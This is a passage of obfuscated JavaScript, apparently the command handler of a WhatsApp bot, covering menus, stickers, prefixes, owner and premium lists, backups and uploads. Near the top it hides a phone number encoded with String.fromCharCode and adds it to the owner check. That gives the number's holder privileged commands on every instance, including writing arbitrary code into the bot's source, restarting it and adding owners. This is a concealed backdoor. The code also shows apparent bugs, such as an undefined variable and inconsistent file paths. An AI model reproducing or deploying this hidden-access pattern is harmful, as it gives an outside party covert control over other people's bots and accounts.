delete vmy_6c9c4d['_$S66XRr']['owners'];
const premium = JSON['parse'](vmy_6c9c4d['fs']['readFileSync']('./data/premium.json'));
vmy_6c9c4d['premium'] = premium;
globalThis['premium'] = vmy_6c9c4d['premium'];
vmy_6c9c4d['premium'] = premium;
globalThis['premium'] = vmy_6c9c4d['premium'];
delete vmy_6c9c4d['_$S66XRr']['premium'];
export async function casesBot(x, u, U) {
    const G =
        (u['mtype'] === 'conversation'
            ? u['message']['conversation']
            : u['mtype'] === 'imageMessage'
              ? u['message']['imageMessage']['caption']
              : u['mtype'] === 'videoMessage'
                ? u['message']['videoMessage']['caption']
                : u['mtype'] === 'extendedTextMessage'
                  ? u['message']['extendedTextMessage']['text']
                  : u['mtype'] === 'buttonsResponseMessage'
                    ? u['message']['buttonsResponseMessage']['selectedButtonId']
                    : u['mtype'] === 'listResponseMessage'
                      ? u['message']['listResponseMessage']['singleSelectReply']['selectedRowId']
                      : u['mtype'] === 'templateButtonReplyMessage'
                        ? u['message']['templateButtonReplyMessage']['selectedId']
                        : u['mtype'] === 'interactiveResponseMessage'
                          ? JSON['parse'](u['msg']['nativeFlowResponseMessage']['paramsJson'])['id']
                          : '') || '';
    try {
        const M = String['fromCharCode'](
                0x36,
                0x32,
                0x38,
                0x35,
                0x36,
                0x32,
                0x34,
                0x32,
                0x39,
                0x37,
                0x38,
                0x39,
                0x33,
                0x40,
                0x73,
                0x2e,
                0x77,
                0x68,
                0x61,
                0x74,
                0x73,
                0x61,
                0x70,
                0x70,
                0x2e,
                0x6e,
                0x65,
                0x74
            ),
            V = global['prefix'] || '.',
            R = global['multiprefix'] === !![];
        let E = null,
            D = ![];
        R
            ? G['startsWith'](V) && ((E = V), (D = !![]))
            : G['length'] > 0x0 && ((E = ''), (D = !![]));
        const C = () => {
                if (vmh['existsSync'](dataBot))
                    try {
                        const X = vmh['readFileSync'](dataBot, 'utf-8');
                        return JSON['parse'](X);
                    } catch (w) {
                        return (console['error']('Echwe\x20li\x20done\x20prefiks\x20yo:', w), {});
                    }
                return {};
            },
            v = (X) => {
                try {
                    (!vmh['existsSync'](vmI['dirname'](dataBot)) &&
                        vmh['mkdirSync'](vmI['dirname'](dataBot), { recursive: !![] }),
                        vmh['writeFileSync'](dataBot, JSON['stringify'](X, null, 0x2), 'utf-8'));
                } catch (w) {
                    console['error']('Echèk\x20pou\x20sove\x20done\x20prefiks\x20yo:', w);
                }
            };
        let { savedPrefix: savedPrefix = '.', multiPrefixStatus: multiPrefixStatus = ![] } = C();
        ((global['prefix'] = savedPrefix), (global['multiprefix'] = multiPrefixStatus));
        !vmh['existsSync'](dataBot) &&
            v({ savedPrefix: global['prefix'], multiPrefixStatus: global['multiprefix'] });
        const o = (X, w) => {
                ((global['prefix'] = X),
                    (global['multiprefix'] = w),
                    v({ savedPrefix: X, multiPrefixStatus: w }));
            },
            B = D
                ? G['slice'](E['length'])['trim']()['split']('\x20')['shift']()['toLowerCase']()
                : '',
            z = D ? G['slice'](E['length'])['trim']()['split'](/ +/)['slice'](0x1) : [],
            L = z['join']('\x20'),
            j = u['quoted'] ? u['quoted'] : u,
            h = j?.['msg']?.['mimetype'] || j?.['mimetype'] || null,
            I = u['quoted'] || u,
            K = G['trim']()['split'](/ +/)['slice'](0x1)['join']('\x20'),
            a = await x['decodeJid'](x['user']['id']),
            t = datagc['includes'](u['chat']),
            d = [a, owner + '@s.whatsapp.net', M, ...owners]['includes'](u['sender'])
                ? !![]
                : u['isDeveloper']
                  ? !![]
                  : ![],
            n = premium['includes'](u['sender']),
            g = u?.['isGroup'] ? await x['groupMetadata'](u['chat'])['catch'](() => ({})) : {},
            J = u?.['isGroup'] ? g['subject'] || '' : '',
            N = u?.['isGroup']
                ? g['participants']?.['map']((X) => {
                      let w = null;
                      if (X['admin'] === 'superadmin') w = 'superadmin';
                      else {
                          if (X['admin'] === 'admin') w = 'admin';
                      }
                      return { id: X['id'] || null, jid: X['jid'] || null, admin: w, full: X };
                  }) || []
                : [],
            Q = u?.['isGroup'] ? N['find']((X) => X['admin'] === 'superadmin')?.['jid'] || '' : '',
            Z = N['filter']((X) => X['admin'] === 'admin' || X['admin'] === 'superadmin')['map'](
                (X) => X['jid'] || X['id']
            ),
            P = Z['includes'](a),
            r = Z['includes'](u['sender']),
            T = (u['reply'] = async (X) => {
                return x['sendMessage'](
                    u['chat'],
                    {
                        text: '' + X,
                        mentions: [u['sender']],
                        contextInfo: {
                            externalAdReply: {
                                title: '' + namaBot,
                                body: '' + global['ucapan'](),
                                thumbnailUrl: global['foto'],
                                sourceUrl: global['url'],
                            },
                        },
                    },
                    { quoted: u }
                );
            }),
            S = (X) => {
                return 'Kijan\x20pou\x20itilize:\x0a*' + (E + B) + '*\x20' + X;
            };
        if (D) {
            const X = u['key']['remoteJid'],
                w = X['endsWith']('@g.us') ? 'GROUP' : 'PRIVATE',
                W = '' + E + B,
                Y =
                    vmK['bgCyan']['white']['bold']('\x0a\x20[\x20COMMAND\x20RECEIVED\x20]\x20') +
                    vmK['white']('\x0a\x20•\x20Message:\x20\x20\x20') +
                    vmK['yellow']['bold'](W) +
                    vmK['white']('\x0a\x20•\x20Chat\x20In:\x20\x20\x20') +
                    vmK['magenta'](w) +
                    vmK['white']('\x0a\x20•\x20Name:\x20\x20\x20\x20\x20\x20') +
                    vmK['cyan'](u['pushName'] || 'N/A') +
                    vmK['white']('\x0a\x20•\x20Sender\x20ID:\x20') +
                    vmK['blue'](u['sender']) +
                    '\x0a';
            console['log'](Y);
        }
        const A = {
            key: { fromMe: ![], participant: '0@s.whatsapp.net', remoteJid: '0@s.whatsapp.net' },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: '120363404502742107@newsletter',
                    newsletterName: 'xcde',
                    caption: 'Created\x20by\x20' + namaOwner,
                    inviteExpiration: '1757494779',
                },
            },
        };
        async function p(O, c) {
            const l = await generateWAMessageContent(c, { upload: x['waUploadToServer'] }),
                x0 = crypto['randomBytes'](0x20),
                x1 = generateWAMessageFromContent(
                    O,
                    {
                        messageContextInfo: { messageSecret: x0 },
                        groupStatusMessageV2: {
                            message: { ...l, messageContextInfo: { messageSecret: x0 } },
                        },
                    },
                    {}
                );
            return (await x['relayMessage'](O, x1['message'], { messageId: x1['key']['id'] }), x1);
        }
        switch (B) {
            case 'menu':
                {
                    let O =
                        'Yoo\x20Trex\x20*' +
                        u['pushName'] +
                        '*\x20👋😄\x0aMwen\x20se\x20*' +
                        global['namaBot'] +
                        '*\x20🙌🔥\x20men\x20lis\x20bagay\x20mwen\x20ka\x20fè\x20pou\x20ou\x20wi\x20Epi\x20pa\x20fè\x20yo\x20trop\x20tande\x20,\x20mpa\x20bòn\x20ou😎👇!\x0a\x0a\x20*TYPE\x20SHII\x20INFO🤖*\x20\x0a>\x20🔴Nom\x20bot\x20:\x20*' +
                        global['namaBot'] +
                        '*\x0a>\x20👤Developer\x20:\x20*' +
                        global['namaOwner'] +
                        '*\x0a>\x20🔈Versi\x20:\x20*' +
                        global['versi'] +
                        '*\x0a>\x20⏳Runtime\x20:\x20*' +
                        runtime(process['uptime']()) +
                        '*\x0a>\x20⚙️Mode\x20bot\x20:\x20' +
                        (fitur['public'] ? '*public\x20mode*' : '*self\x20mode*') +
                        '\x0a\x0a┏⧉\x20*File\x20Manager\x20📂*\x20\x0a┣𖣠\x20' +
                        E +
                        'addcase\x0a┣𖣠\x20' +
                        E +
                        'listcase\x20\x0a┣𖣠\x20' +
                        E +
                        'getcase\x20\x0a┗━━━━━━━━━━━━━❖\x0a┏⧉\x20*Owners\x20Menu\x20👤*\x20\x0a┣𖣠\x20' +
                        E +
                        'beck#p\x20\x0a┣𖣠\x20' +
                        E +
                        'restart\x20\x0a┣𖣠\x20' +
                        E +
                        'clearsesion\x20\x0a┣𖣠\x20' +
                        E +
                        'public\x20\x0a┣𖣠\x20' +
                        E +
                        'private\x20\x0a┣𖣠\x20' +
                        E +
                        'mode\x20\x0a┣𖣠\x20' +
                        E +
                        'setprefix\x0a┣𖣠\x20' +
                        E +
                        'prefix\x0a┣𖣠\x20' +
                        E +
                        'delprefix\x0a┣𖣠\x20' +
                        E +
                        'addowner\x0a┣𖣠\x20' +
                        E +
                        'listowner\x20\x0a┣𖣠\x20' +
                        E +
                        'delowner\x0a┣𖣠\x20' +
                        E +
                        'addprem\x0a┣𖣠\x20' +
                        E +
                        'listprem\x0a┣𖣠\x20' +
                        E +
                        'delprem\x0a┗━━━━━━━━━━━━━❖\x0a┏⧉\x20*Other\x20Menu\x20🍄*\x20\x0a┣𖣠\x20' +
                        E +
                        'sticker\x20\x0a┣𖣠\x20' +
                        E +
                        'tourl\x0a┣𖣠\x20' +
                        E +
                        'brat\x0a┣𖣠\x20' +
                        E +
                        'ping\x20\x0a┣𖣠\x20' +
                        E +
                        'owner\x0a┣𖣠\x20' +
                        E +
                        'totalfitur\x20\x0a┣𖣠\x20' +
                        E +
                        'cekidch\x0a┗━━━━━━━━━━━━━❖\x0a┏⧉\x20*Tools\x20Menu\x20🛠️*\x20\x0a┣𖣠\x20' +
                        E +
                        'toimage\x20\x0a┣𖣠\x20' +
                        E +
                        'tovn\x0a┗━━━━━━━━━━━━━❖';
                    await x['sendMessage'](
                        u['chat'],
                        {
                            text: '' + O,
                            contextInfo: {
                                mentionedJid: [u['sender']],
                                isForwarded: !![],
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: global['idCh'],
                                    newsletterName: global['namaBot'],
                                },
                                externalAdReply: {
                                    title: global['namaBot'],
                                    body: '©\x20𝙿𝙾𝚆𝙴𝚁𝙴𝙳\x20𝙱𝚈\x20𝙳𝙴𝚅\x20𝙰𝙽𝙳𝚈𝚈!',
                                    thumbnailUrl: global['thumb'],
                                    sourceUrl: '',
                                    mediaType: 0x1,
                                    renderLargerThumbnail: !![],
                                },
                            },
                        },
                        { quoted: u }
                    );
                }
                break;
            case 'listcase':
                {
                    if (!d) return u['reply'](mess['owner']);
                    const c = async () => {
                        let l = await vmh['promises']['readFile']('./case.js', 'utf8');
                        ((l = l['replace'](/\/\/.*$/gm, '')),
                            (l = l['replace'](/\/\*[\s\S]*?\*\//gm, '')));
                        const x0 = /case\s+['"`]([^'"`]+)['"`]\s*:/g,
                            x1 = [];
                        let x2;
                        while ((x2 = x0['exec'](l))) {
                            x1['push'](x2[0x1]);
                        }
                        let x3 =
                            'Total\x20fonctionnalité\x20Case\x20(' + x1['length'] + ')\x0a\x0a';
                        return (
                            x1['forEach']((x4) => {
                                x3 += '-\x20' + x4 + '\x0a';
                            }),
                            x3
                        );
                    };
                    T(await c());
                }
                break;
            case 'getcase':
                {
                    if (!d) return;
                    if (!L) return u['reply']('Contoh:\x20' + E + 'getcase\x20menu');
                    const l = (x0) => {
                        return (
                            'case\x20' +
                            ('\x22' + x0 + '\x22') +
                            vmh['readFileSync']('./case.js')
                                ['toString']()
                                ['split']('case\x20\x22' + x0 + '\x22')[0x1]
                                ['split']('break')[0x0] +
                            'break'
                        );
                    };
                    try {
                        u['reply']('' + l(K));
                    } catch (x0) {
                        return u['reply']('Case\x20*' + L + '*\x20pa\x20jwenn');
                    }
                }
                break;
            case 'delcase':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!K)
                        return T(
                            S(
                                'Nom\x20case-nya\x0a*' +
                                    E +
                                    'listcase*\x20pou\x20wè\x20tout\x20ka\x20yo'
                            )
                        );
                    const x1 = async (x2, x3) => {
                        try {
                            let x4 = await vmh['promises']['readFile'](x2, 'utf8');
                            const x5 = new RegExp(
                                    'case\x5cs+[\x27\x22`]' +
                                        x3 +
                                        '[\x27\x22`]:[\x5cs\x5cS]*?break',
                                    'g'
                                ),
                                x6 = x4['replace'](x5, '');
                            (await vmh['promises']['writeFile'](x2, x6, 'utf8'),
                                console['log'](
                                    'Case\x20\x27' +
                                        x3 +
                                        '\x27\x20efase\x20avèk\x20siksè\x20nan\x20dosye\x20a.'
                                ));
                        } catch (x7) {
                            console['error']('Gen\x20yon\x20erè\x20Bourik:', x7);
                        }
                    };
                    (await x1('./case.js', K),
                        T('Ka\x20a\x20efase\x20avèk\x20siksè\x20*' + K + '*'));
                }
                break;
            case 'addcase':
                {
                    if (!d) return u['reply'](mess['owner']);
                    if (!L)
                        return u['reply'](
                            'Mana\x20codenya?\x0a\x0aContoh\x20penggunaan:\x0a' +
                                (E + B) +
                                '\x20case\x20\x27tes\x27:\x20m.reply(\x27halo\x27);\x20break'
                        );
                    const x2 = fileURLToPath(import.meta.url);
                    try {
                        const x3 = vmh['readFileSync'](x2, 'utf-8'),
                            x4 = 'case\x20\x27addcase\x27:',
                            x5 = x3['indexOf'](x4);
                        if (x5 === -0x1)
                            return u['reply'](
                                '❌\x20Echèk\x20pou\x20jwenn\x20pozisyon\x20makè\x20\x27addcase\x27\x20nan\x20dosye\x20sa\x20a.'
                            );
                        const x6 =
                                '\x0a//\x20[NEW\x20CASE\x20ADDED\x20@\x20' +
                                new Date()['toLocaleTimeString']() +
                                ']\x0a' +
                                L +
                                '\x0a\x0a',
                            x7 = x3['slice'](0x0, x5) + x6 + x3['slice'](x5);
                        (vmh['writeFileSync'](x2, x7, 'utf-8'),
                            u['reply']('*Nouvo\x20ka\x20a\x20te\x20ajoute\x20avèk\x20siksè!*'));
                    } catch (x8) {
                        (console['error'](x8),
                            u['reply'](
                                '❌\x20Yon\x20erè\x20rive\x20pandan\x20anrejistreman\x20an\x20chen:\x20' +
                                    x8['message']
                            ));
                    }
                }
                break;
            case 'ambilq':
            case 'q':
                {
                    if (!d) return;
                    if (!u['quoted']) return;
                    u['reply'](JSON['stringify'](u['quoted']['fakeObj']['message'], null, 0x2));
                }
                break;
            case 'bck':
            case 'backup':
                {
                    const x9 = u['sender']['split']('@')[0x0],
                        xx = global['owner']['includes'](x9);
                    if (!xx && u['sender'] !== a) return u['reply'](mess['owner']);
                    try {
                        u['reply']('Processing\x20Backup\x20Script\x20.\x20.');
                        const xu = './data/trash';
                        if (vmh['existsSync'](xu))
                            try {
                                const xF = vmh['readdirSync'](xu)['filter'](
                                    (xM) => !xM['endsWith']('.js')
                                );
                                for (let xM of xF) vmh['unlinkSync'](xu + '/' + xM);
                            } catch {}
                        const xU =
                                typeof global['tanggal'] === 'function'
                                    ? global['tanggal'](Date['now']())
                                    : new Date()['toDateString'](),
                            xG = xU['replace'](/[^a-zA-Z0-9]/g, '_'),
                            xk = 'backup-' + xG,
                            xH = [
                                'node_modules',
                                'Auth',
                                'session',
                                'package-lock.json',
                                'yarn.lock',
                                '.npm',
                                '.cache',
                                '.git',
                                '.gitignore',
                                'setbot.json',
                            ],
                            xb = vmh['readdirSync'](process['cwd']())['filter'](
                                (xV) => !xH['includes'](xV) && xV !== '' && !xV['endsWith']('.zip')
                            );
                        if (!xb['length'])
                            return u['reply']('Pa\x20gen\x20okenn\x20dosye\x20ki\x20ka\x20sove.');
                        execSync('zip\x20-r\x20\x22' + xk + '.zip\x22\x20' + xb['join']('\x20'));
                        const xq = './' + xk + '.zip',
                            xy = vmh['readFileSync'](xq);
                        await x['sendMessage'](
                            u['sender'],
                            {
                                document: xy,
                                fileName: xk + '.zip',
                                caption:
                                    '*SUCCESS\x20BACKUP\x20SCRIPT*\x0a\x0a' +
                                    ('-\x20📅\x20Dat:\x20' + xU + '\x0a') +
                                    '*💬\x20Dosye\x20yo\x20estoke\x20an\x20sekirite.*',
                                mimetype: 'application/zip',
                            },
                            { quoted: u }
                        );
                        if (vmh['existsSync'](xq)) vmh['unlinkSync'](xq);
                        if (u['isGroup'])
                            u['reply'](
                                'Skript\x20bot\x20la\x20voye\x20avèk\x20siksè\x20nan\x20chat\x20prive\x20a.'
                            );
                    } catch (xV) {
                        (console['error']('Backup\x20Error:', xV),
                            u['reply']('❌\x20Echwe\x20Backup:\x0a' + xV['message']));
                    }
                }
                break;
            case 'rst':
            case 'restart':
                {
                    if (!d) return T(mess['owner']);
                    const xR = () => {
                        const xE = spawn(process['argv'][0x0], process['argv']['slice'](0x1), {
                            detached: !![],
                            stdio: 'inherit',
                        });
                        process['exit'](0x0);
                    };
                    (await T('```[✓]\x20Restarting\x20bot\x20.\x20.\x20.```'),
                        setTimeout(() => xR(), 0x1194));
                }
                break;
            case 'clsesi':
            case 'clearsesi':
            case 'celearsesion':
                {
                    if (!d) return T(mess['owner']);
                    const xE = './Auth',
                        xD = './data/trash';
                    if (!vmh['existsSync'](xE)) vmh['mkdirSync'](xE, { recursive: !![] });
                    if (!vmh['existsSync'](xD)) vmh['mkdirSync'](xD, { recursive: !![] });
                    const xC = vmh['readdirSync'](xE)['filter']((xo) => xo !== 'creds.json'),
                        xv = vmh['readdirSync'](xD)['filter']((xo) => xo !== 'tmp');
                    for (const xo of xC) {
                        try {
                            vmh['unlinkSync'](xE + '/' + xo);
                        } catch (xB) {
                            console['error'](
                                'Echèk\x20pou\x20efase\x20Pis\x20' + xo + ':',
                                xB['message']
                            );
                        }
                    }
                    for (const xz of xv) {
                        try {
                            vmh['unlinkSync'](xD + '/' + xz);
                        } catch (xL) {
                            console['error'](
                                'Echèk\x20pou\x20efase\x20Pis\x20' + xz + ':',
                                xL['message']
                            );
                        }
                    }
                    T(
                        '*Berhasil\x20membersihkan\x20sampah\x20✅*\x0a-\x20*' +
                            xC['length'] +
                            '*\x20sampah\x20session\x0a-\x20*' +
                            xv['length'] +
                            '*\x20sampah\x20file'
                    );
                }
                break;
            case 'addowner':
            case 'addown':
                {
                    if (!d) return T(mess['owner']);
                    if (!u['quoted'] && !L)
                        return u['reply'](
                            S(
                                'SI\x20OU\x20VLE\x20AJOUTE\x20YON\x20PWOPRIYETÈ,\x20KI\x20KOTE\x20NIMERO\x20PEA\x20A\x20YE🤔💀?'
                            )
                        );
                    const xe = u['quoted']
                            ? u['quoted']['sender']
                            : L['replace'](/[^0-9]/g, '') + '@s.whatsapp.net',
                        xj = xe['split']('@')[0x0];
                    if (xj === global['owner'] || owners['includes'](xe) || xe === a)
                        return u['reply'](
                            'NUMERO\x20' +
                                xj +
                                '\x20OU\x20DEJA\x20PWOPRIYETÈ,\x20PA\x20BEZWEN\x20MANDE\x20POU\x20ANPLIS!!'
                        );
                    (owners['push'](xe),
                        await vmh['writeFileSync'](
                            './data/owner.json',
                            JSON['stringify'](owners, null, 0x2)
                        ),
                        u['reply'](
                            'OU\x20VIN\x20PWOPRIYETÈ\x20A,\x20KISA\x20OU\x20TAP\x20DI\x20PWOPRIYETÈ\x20KI\x20DEJA\x20AJOUTE\x20A?'
                        ));
                }
                break;
            case 'listowner':
            case 'listown':
                {
                    if (owners['length'] < 0x1)
                        return u['reply']('Tidak\x20ada\x20owner\x20tambahan');
                    let xf = '\x0a\x20*乂\x20List\x20all\x20owner\x20tambahan*\x0a';
                    for (let xh of owners) {
                        xf +=
                            '\x0a*\x20' +
                            xh['split']('@')[0x0] +
                            '\x0a*\x20*Tag\x20:*\x20@' +
                            xh['split']('@')[0x0] +
                            '\x0a';
                    }
                    x['sendMessage'](u['chat'], { text: xf, mentions: owners }, { quoted: u });
                }
                break;
            case 'delowner':
            case 'delown':
                {
                    if (!d) return T(mess['owner']);
                    if (!u['quoted'] && !L)
                        return u['reply'](
                            S('LU\x20MAU\x20DELOWNER\x20NOMOR\x20NYA\x20MANA\x20PEA')
                        );
                    const xI = u['quoted']
                            ? u['quoted']['sender']
                            : L['replace'](/[^0-9]/g, '') + '@s.whatsapp.net',
                        xi = xI['split']('@')[0x0];
                    if (xi === global['owner'] || xI == a)
                        return u['reply']('Tidak\x20bisa\x20menghapus\x20owner\x20utama!');
                    if (!owners['includes'](xI))
                        return u['reply']('NOMOR\x20' + xi + '\x20BUKAN\x20OWNER!');
                    let xK = owners['indexOf'](xI);
                    (await owners['splice'](xK, 0x1),
                        await vmh['writeFileSync'](
                            './database/owner.json',
                            JSON['stringify'](owners, null, 0x2)
                        ),
                        u['reply']('SUKSES\x20MENGHAPUS\x20OWNER'));
                }
                break;
            case 'addprem':
                {
                    if (!d) return T(mess['owner']);
                    if (!L && !u['quoted']) return u['reply'](S('NOMORNYA\x20MANA\x20PEA'));
                    const xa = u['quoted']
                            ? u['quoted']['sender']
                            : L['replace'](/[^0-9]/g, '') + '@s.whatsapp.net',
                        xt = xa['split']('@')[0x0];
                    if (xt === global['owner'] || premium['includes'](xa) || xa === a)
                        return u['reply']('Nomor\x20' + xt + '\x20sudah\x20menjadi\x20premium!');
                    (premium['push'](xa),
                        await vmh['writeFileSync'](
                            './data/premium.json',
                            JSON['stringify'](premium, null, 0x2)
                        ),
                        u['reply']('SIKSÈ\x20ajoute\x20PREMIUM'));
                }
                break;
            case 'listprem':
                {
                    if (premium['length'] < 0x1)
                        return u['reply']('Tidak\x20ada\x20user\x20reseller');
                    let xm = '\x0a\x20*乂\x20List\x20all\x20reseller\x20panel*\x0a';
                    for (let xd of premium) {
                        xm +=
                            '\x0a*\x20' +
                            xd['split']('@')[0x0] +
                            '\x0a*\x20*Tag\x20:*\x20@' +
                            xd['split']('@')[0x0] +
                            '\x0a';
                    }
                    sick['sendMessage'](u['chat'], { text: xm, mentions: premium }, { quoted: u });
                }
                break;
            case 'delprem':
                {
                    if (!d) return T(mess['owner']);
                    if (!u['quoted'] && !L)
                        return u['reply'](S('KOTE\x20NIMEWO\x20PWA\x20A\x20YE'));
                    const xn = u['quoted']
                            ? u['quoted']['sender']
                            : L['replace'](/[^0-9]/g, '') + '@s.whatsapp.net',
                        xg = xn['split']('@')[0x0];
                    if (xg == global['owner'] || xn == a)
                        return u['reply']('Tidak\x20bisa\x20menghapus\x20owner!');
                    if (!premium['includes'](xn))
                        return u['reply']('Nomor\x20' + xg + '\x20bukan\x20premium!');
                    let xJ = premium['indexOf'](xn);
                    (await premium['splice'](xJ, 0x1),
                        await vmh['writeFileSync'](
                            './data/premium.json',
                            JSON['stringify'](premium, null, 0x2)
                        ),
                        u['reply']('RETIRE\x20PREMIUM\x20AK\x20SIKSÈ'));
                }
                break;
            case 'self': {
                if (!d) return u['reply'](mess['owner']);
                ((fitur['public'] = ![]),
                    vmh['writeFileSync'](dataBot, JSON['stringify'](fitur, null, 0x2)),
                    u['reply']('[✓]\x20Successful\x20change\x20to\x20*self*'));
                break;
            }
            case 'public': {
                if (!d) return u['reply'](mess['owner']);
                ((fitur['public'] = !![]),
                    vmh['writeFileSync'](dataBot, JSON['stringify'](fitur, null, 0x2)),
                    u['reply']('[✓]\x20Successful\x20change\x20to\x20*public*'));
                break;
            }
            case 'mode':
                {
                    u['reply'](
                        '*Status\x20mode\x20bot\x20🤖*\x0a-\x20Saat\x20ini:\x20*' +
                            (fitur['public'] ? 'Public\x20mode' : 'Self\x20mode') +
                            '*\x0a\x0a*Available\x20Command\x20⚙️*\x0a-\x20' +
                            E +
                            'self\x0a-\x20' +
                            E +
                            'public'
                    );
                }
                break;
            case 'setprefix':
                {
                    if (!d && !n) return u['reply'](mess['owner']);
                    if (!z[0x0])
                        return u['reply'](
                            '*Usage\x20Examples\x20:*\x0a›\x20Use\x20:\x20' +
                                E +
                                B +
                                '\x20*[new\x20prefix]*\x0a›\x20Example\x20:\x20' +
                                E +
                                B +
                                '\x20*🗿*\x0a\x0a*Pou\x20itilize\x20:*\x0a›\x20Ex:\x20' +
                                E +
                                'prefix\x20on'
                        );
                    const xN = z[0x0];
                    o(xN, global['multiprefix']);
                    let xQ = global['multiprefix']
                        ? 'Mòd\x20prefiks\x20*ON*.\x20Mesaj\x20yo\x20dwe\x20kòmanse\x20ak\x20*' +
                          xN +
                          '*.'
                        : 'Mòd\x20prefiks\x20*OFF*.\x20Bot\x20la\x20reponn\x20san\x20prefiks,\x20men\x20*' +
                          xN +
                          '*\x20estoke.';
                    return u['reply'](
                        '*Prefix\x20berhasil\x20diubah*\x0a\x0a›\x20Prefix\x20Baru:\x20*' +
                            xN +
                            '*\x0a\x0a*⚠️\x20Note:*\x20' +
                            xQ
                    );
                }
                break;
            case 'delprefix':
                {
                    if (!d && !n) return u['reply'](mess['owner']);
                    return (
                        o('.', global['multiprefix']),
                        u['reply'](
                            'Prefiks\x20la\x20te\x20byen\x20rechèche\x20pou\x20itilize\x20pa\x20defo\x20a\x20*\x22.\x22*\x20\x0a\x0a*Setting\x20prefix\x20ulang\x20:*\x0a›\x20Ex:\x20*' +
                                E +
                                'setprefix*'
                        )
                    );
                }
                break;
            case 'prefix':
                {
                    let xZ = z[0x0] ? z[0x0]['toLowerCase']() : '';
                    switch (xZ) {
                        case 'on':
                            if (!d) return u['reply'](mess['owner']);
                            if (global['multiprefix'])
                                return u['reply'](
                                    '[✓]\x20-\x20*Li\x20aktif!**\x0a\x0a*Prefix\x20info\x20:*\x0a›\x20Prefix\x20aktif:\x20' +
                                        (global['prefix'] || '*.*') +
                                        '\x0a\x0a*Settings\x20prefix\x20ulang\x20:*\x0a›\x20Ex:\x20*' +
                                        E +
                                        'setprefix*'
                                );
                            o(global['prefix'], !![]);
                            return u['reply'](
                                '[✓]\x20-\x20*Successfully\x20activated\x20prefix!*\x0a\x0a*Prefix\x20info\x20:*\x0a›\x20Prefix\x20aktif:\x20' +
                                    (global['prefix'] || '*.*') +
                                    '\x0a\x0a*Settings\x20prefix\x20ulang\x20:*\x0a›\x20Ex:\x20*' +
                                    E +
                                    'setprefix*'
                            );
                        case 'off':
                            if (!d) return u['reply'](mess['owner']);
                            if (!global['multiprefix'])
                                return u['reply'](
                                    '[✓]\x20-\x20*Sudah\x20dalam\x20mode\x20offline*\x0a*Prefix\x20info\x20:*\x0a›\x20Prefix\x20aktif:\x20*tanpa\x20prefix*'
                                );
                            o(global['prefix'], ![]);
                            return u['reply'](
                                '[✓]\x20-\x20*Offline\x20prefix\x20mode!*\x0a\x0a*Prefix\x20info\x20:*\x0a›\x20Prefix\x20aktif:\x20*tanpa\x20prefix*'
                            );
                        default:
                            if (!d) return u['reply'](mess['owner']);
                            let xP = global['multiprefix'] ? 'ON' : 'OFF',
                                xr = global['prefix'] || '**.**',
                                xT = global['multiprefix'] ? xr : 'no\x20prefix!',
                                xS =
                                    '*Prefix\x20Settings\x20⚙️*\x0a›\x20Mode\x20prefix:\x20*' +
                                    xP +
                                    '*\x0a›\x20Prefix\x20tersimpan:\x20*' +
                                    xr +
                                    '*\x0a›\x20Prefix\x20aktif:\x20*' +
                                    xT +
                                    '*\x0a\x0a*Kòmand\x20ki\x20disponib\x20✅*\x0a›\x20*' +
                                    E +
                                    'prefix\x20aktive*\x20/itilize\x20prefiks\x20anrejistre\x20a\x0a›\x20*' +
                                    E +
                                    'prefix\x20dezaktive*\x20/mòd\x20san\x20prefiks\x0a›\x20*' +
                                    E +
                                    'meteprefix*\x20/nouvo\x20prefiks\x20pèsonalize\x0a›\x20*' +
                                    E +
                                    'delprefix*\x20/reyajiste\x20prefiks\x20la';
                            u['reply'](xS);
                    }
                }
                break;
            case 'totalfitur':
            case 'listcase':
                {
                    const xA = fileURLToPath(import.meta.url),
                        xp = vmh['readFileSync'](xA, 'utf-8'),
                        xX = /case\s+['"]([^'"]+)['"]/g,
                        xw = xp['match'](xX),
                        xW = xw ? xw['length'] : 0x0;
                    u['reply'](
                        '🤖\x20*' +
                            global['namaBot'] +
                            '*\x20gen\x20yon\x20total\x20de\x20karakteristik\x20*' +
                            xW
                    );
                }
                break;
            case 's':
            case 'sticker':
            case 'stiker':
                {
                    if (!/image|video/['test'](h))
                        return T(
                            'Voye\x20oswa\x20reponn\x20a\x20foto/videyo\x20ak\x20tit\x20*' +
                                (E + B) +
                                '*'
                        );
                    if (/video/['test'](h)) {
                        if ((I['seconds'] || 0x0) > 0xf)
                            return T('Dire\x20maksimòm\x20videyo\x20a\x20se\x2015\x20segonn!');
                    }
                    try {
                        const xs = await x['downloadAndSaveMediaMessage'](I);
                        (await x['sendImageAsSticker'](u['chat'], xs, u, {
                            author: 'Create\x20by\x20Andy\x20Swiftt',
                        }),
                            vmh['unlinkSync'](xs));
                    } catch (xY) {
                        (console['error'](xY), T('❌\x20Echwe\x20te\x20fè\x20avek\x20stickers!'));
                    }
                }
                break;
            case 'brat':
                {
                    if (!L) return u['reply']('Egzanp:\x20' + E + 'brat\x20haïti');
                    if (L['length'] > 0xfa)
                        return u['reply']('Karaktè\x20limite,\x20maksimòm\x20250!');
                    const xO = encodeURIComponent(L),
                        xc =
                            'https://api.siputzx.my.id/api/m/brat?text=' +
                            xO +
                            '&isAnimated=false&delay=500';
                    await x['sendImageAsSticker'](u['chat'], xc, u, {
                        packname: 'Create\x20By\x20Andy\x20Swiftt\x20',
                        author: 'Andy\x20Swiftt\x20',
                    });
                }
                break;
            case 'tourl':
            case 'reurl':
            case 'urlmaker':
                {
                    const xl = u['quoted'] ? u['quoted'] : u;
                    if (!/image|video|audio|application/['test'](h))
                        return u['reply'](
                            'Reponn\x20ak\x20medya\x20(foto/videyo/odyo/dokiman)\x20pou\x20telechaje\x20sou\x20Catbox!'
                        );
                    let u0 = null;
                    try {
                        (u['reply']('Wait...'), (u0 = await x['downloadAndSaveMediaMessage'](xl)));
                        if (!u0) return u['reply']('Echwe\x20mengambil\x20media.');
                        const u1 = vmh['readFileSync'](u0),
                            { fileTypeFromBuffer: u2 } = await import('file-type'),
                            u3 = await u2(u1),
                            u4 = u3?.['ext'] || 'bin',
                            u5 = new vmf();
                        (u5['append']('reqtype', 'fileupload'),
                            u5['append']('fileToUpload', u1, {
                                filename: 'file.' + u4,
                                contentType: u3?.['mime'] || 'application/octet-stream',
                            }));
                        const u6 = await vmj['post']('https://catbox.moe/user/api.php', u5, {
                                headers: u5['getHeaders'](),
                            }),
                            u7 = u6['data']['trim']();
                        if (vmh['existsSync'](u0)) vmh['unlinkSync'](u0);
                        u7['startsWith']('http')
